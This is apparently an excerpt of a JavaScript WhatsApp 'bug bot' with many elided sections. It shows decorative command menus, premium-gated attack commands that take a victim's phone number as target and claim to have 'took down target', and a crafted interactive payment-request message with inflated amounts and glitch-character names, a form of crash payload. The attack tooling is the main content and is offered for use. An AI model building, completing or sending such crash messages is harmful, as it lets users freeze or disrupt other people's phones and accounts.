...
const xbug = fs.readFileSync(`./database/image/zan.jpg`)
const Xynz = fs.readFileSync(`./database/image/charisma.jpg`) 
...
contextInfo: {
    externalAdReply: {
        ...
        body: `🕑 ${waktu}`,
        sourceUrl: '',
        thumbnail: await fs.readFileSync('./database/image/raku.jpg'),
			...
			'message': {
				"interactiveMessage": {
					...
					"nativeFlowMessage": {
						"buttons": [{
							"name": "review_and_pay",
							"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"️࿆᷍🩸⃟༑⌁⃰ᴮᴸᴬᶜᴷ ᴰᴱⱽᴵᴸ.  乃ㄩᎶ ͜͡⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
						}]
					}
				}
			}
...
item3.URL:https://www.youtube.com/@BLACK_DEVIL-OFFICIAL-1
            ...
            zyn.sendMessage(m.chat,
{
    ...
    contextInfo: {
        ...
        "externalAdReply": {
            ...
            "previewType": "PHOTO",
            "thumbnailUrl": ``,
            "thumbnail": fs.readFileSync(`./database/image/charisma.jpg`),
            "sourceUrl": `${isLink}`
        }
    }
},
                        ...
                        m.chat,
                        {
                            ...
                            contextInfo: {
                                externalAdReply: {
                                    ...
                                    thumbnailUrl:
                                    "https://files.catbox.moe/wzpw3c.jpg",
                                    sourceUrl: global.isLink,
                                    mediaType: 1,
                                    renderLargerThumbnail: true
                                }
...
let menya = `   \`𝘉𝘓𝘈𝘊𝘒 𝘋𝘌𝘝𝘐𝘓 🅑🅤🅖 🅑🅞🅣 ︎︎︎\`
┏─── ｢ 𝟑𝐴𝑆𝐻𝑅𝑌* ｣ ──❐
┃♰♰ 𝐍OM : *${global.namabot}*
┃♰♰ sTYLE 🥷 : *𝑋 𝟑𝐴𝑆𝐻𝑅𝑌 *
┃♰♰ 𝐃𝐞𝐯 ​​​​​​​​​​​​​​​​​​​​​​​​​​💎 : *${global.namacreator}*
┃♰♰ 𝐕𝐞𝐫𝐬𝐢on 𓆩🦠𓆪 : *${global.versisc}*
┃♰♰ 𝐑𝐮𝐧 : *${runtime(process.uptime())}*
┗──────────────❐
https://www.youtube.com/@
▭▬▭▬▭▬▭▬▭▬▭▬▭
...
let menya = `   \`𝟑𝒂𝒔𝒉𝒓𝒚🕷️ 🅑🅤🅖 🅑🅞🅣︎\`
┏─── ｢ *𝟑𝒂𝒔𝒉𝒓𝒚🕷️* ｣ ──❐
┃⃞⃞🕷️ NOM : *${global.namabot}*
┃⃞⃞🕷️ STYLE : *devil *
┃⃞⃞🕷️ 𝐃𝐞𝐯 : *${global.namacreator}*
┃⃞⃞🕷️ 𝐕𝐞𝐫𝐬𝐢on : *${global.versisc}*
┃⃞⃞🕷️ 𝐑𝐮𝐧 : *${runtime(process.uptime())}*
┗──────────────❐
┏─ 𝟑𝒂𝒔𝒉𝒓𝒚🕷️🍷️ 🅑🅤🅖 🅑🅞🅣 』
│ ⃞⃞🕸️ ᴇɴᴄ <ᴄᴏᴅᴇ>
│ ⃞⃞🕸️ ᴇɴᴄʀʏᴘᴛ <ᴄᴏᴅᴇ>
...
let menya = `   \`𝟑𝒂𝒔𝒉𝒓𝒚🕷️ 🅑🅤🅖 🅑🅞🅣\`
┏─── ｢ 𝟑𝒂𝒔𝒉𝒓𝒚🕷️ ｣ ──❐
┃ ⃢🔞NOM : *${global.namabot}*
 ┃⃢🔞   STYLE : *𝟑𝒂𝒔𝒉𝒓𝒚🕷️*
 ┃⃢🔞  𝐃𝐞𝐯 : *${global.namacreator}*
    ⃢🔞       𝐕𝐞𝐫𝐬𝐢 : *${global.versisc}*
 ┃⃢🔞            𝐑𝐮𝐧 : *${runtime(process.uptime())}*
┗──────────────❐
┏─『𝐆𝐑𝐎𝐔𝐏 𝐌𝐄𝐍𝐔』
│ 🐉⃞⃞ ʜɪᴅᴇᴛᴀɢ <ǫᴜᴇʀʏ>
│ 🐉⃞⃞ ᴛᴀɢᴀʟʟ <ǫᴜᴇʀʏ>
...
let menya = `   \`𝟑𝒂𝒔𝒉𝒓𝒚🕷️ 🅑🅤🅖 🅑🅞🅣🐉⃞⃞\`
┏─── ｢ *𝑩𝑳𝑨𝑪𝑲 𝑫𝑬𝑽𝑰𝑳* ｣ ──❐
┃🐉⃞⃞ NOM : *${global.namabot}*
┃🐉⃞⃞ STYLE  : *𝟑𝒂𝒔𝒉𝒓𝒚🕷️ *
┃🐉⃞⃞ 𝐃𝐞𝐯 : *${global.namacreator}*
┃🐉⃞⃞ 𝐕𝐞𝐫𝐬𝐢on : *${global.versisc}*
┃🐉⃞⃞ 𝐑𝐮𝐧 : *${runtime(process.uptime())}*
┗──────────────❐
┏─『𝟑𝒂𝒔𝒉𝒓𝒚🕷️』
│ 🐉⃞⃞ *allmenu*
│ 🐉⃞⃞   mody-menu*
...
let menya = `   \`𝟑𝒂𝒔𝒉𝒓𝒚🕷️ 🅑🅤🅖 🅑🅞🅣 ︎\`
┏─── ｢ *𝟑𝒂𝒔𝒉𝒓𝒚🕷️ 🖤ꫝ✨* ｣ ──❐
┃𓆩🖤𓆪 𝐍om : *${global.namabot}*
┃𓆩🖤𓆪 STYLE: *𝟑𝒂𝒔𝒉𝒓𝒚🕷️ *
┃𓆩🖤𓆪 𝐃𝐞𝐯 : *${global.namacreator}*
┃𓆩🖤𓆪 𝐕𝐞𝐫𝐬𝐢on : *${global.versisc}*
┃𓆩🖤𓆪 𝐑𝐮𝐧 : *${runtime(process.uptime())}*
┗──────────────❐
                 👑𝐘𝐨𝐮𝐓𝐮𝐛𝐞👑
                        👇🏼
https://www.youtube.com/@
...
case 'xraku': case 'xioszan': case 'sendzan':
if (!isPremium) return reply(mess.only.premium)
...
case 'devil': case 'infinity': case 'bankai': 
if (!isPremium) return reply(mess.only.premium)
if (!q) return reply(`Example: ${prefix + command} 234×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(bugres)
...
case 'nagi': case 'furax': case 'solo':
if (!isPremium) return reply(mess.only.premium)
if (!q) return reply(`Example: ${prefix + command} 234×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(bugres)
...
𝐒𝐓𝐀𝐓𝐔𝐒 : 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆
    ...
    𝐍𝐎𝐓𝐄
> 𝐒𝐔𝐊𝐔𝚴𝚫 𝛁2😈 TOOK DOWN TARGET`)
break

case 'hollow': case 'rip': case 'xios': case 'nullmemory': case 'vasion': case 'overflow':
if (!isPremium) return reply(mess.only.premium)
if (!q) return reply(`Example: ${prefix + command} 234×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(bugres)
  ...
  viewOnceMessage: {
    message: {
        ...
        interactiveMessage: proto.Message.InteractiveMessage.create({
          ...
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./database/image/charisma.jpg')}, { upload: zyn.waUploadToServer })  
          }),
